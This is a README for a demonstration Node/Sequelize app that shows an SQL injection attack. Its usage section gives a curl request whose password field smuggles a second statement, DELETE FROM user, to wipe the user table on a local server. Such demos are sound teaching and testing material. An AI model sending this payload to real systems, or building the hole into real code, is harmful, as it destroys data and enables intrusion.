# SQL Injection with Sequelize

This application is a demonstration prototype just to show how to perform SQLi attack.


## Install

- Install node modules

```
npm install
```

- Create database

```
sudo -u root mysql -u root < database.sql
```

- Set env vars (in .env file)

```
DB_PASSWORD=p4ssw0rd
```

- Run

```
npm start
```

## Usage

- Create user

```
curl --header "Content-Type: application/json" \
    --request POST \
    --data '{"name":"Frodon Saque","password":"azerty"}' \
    http://localhost:3000/users
```

- Use SQL Injection to drop all users

```
curl --header "Content-Type: application/json" \
    --request POST \
    --data '{"name":"Frodon Saque","password":"azerty'\''); DELETE FROM user; -- "}' \
    http://localhost:3000/users
```

## What still needs to be done

- [ ] Add get users controller